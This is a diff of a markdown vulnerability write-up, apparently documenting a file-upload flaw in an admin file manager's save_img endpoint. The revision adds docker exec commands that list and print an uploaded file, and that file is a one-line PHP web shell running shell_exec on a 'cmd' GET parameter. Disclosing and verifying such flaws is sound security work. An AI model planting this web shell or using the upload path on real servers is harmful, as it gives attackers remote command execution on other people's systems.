@@ -179,17 +179,27 @@ fetch('/admin/includes/modules/filemanager/ajax_calls.php?action=save_img', {
 
 The file was found at the following path:
 
-```text
-/var/www/html/export/smithbraz.php
+List Command:
+
+```bash
+sudo docker exec -it f2591cb1757b ls -l /var/www/html/export/smithbraz.php
 ```
 
 Result:
 
-```text
--rw-r--r-- 1 www-data www-data 40 Nov 5 18:02 smithbraz.php
+```bash
+-rw-r--r-- 1 www-data www-data 39 Nov 12 16:44 /var/www/html/export/smithbraz.php
 ```
 
 Content:
+
+Cat Command:
+
+```bash
+sudo docker exec -it f2591cb1757b cat /var/www/html/export/smithbraz.php
+```
+
+Result:
 
 ```php
 <?php echo shell_exec($_GET['cmd']); ?>
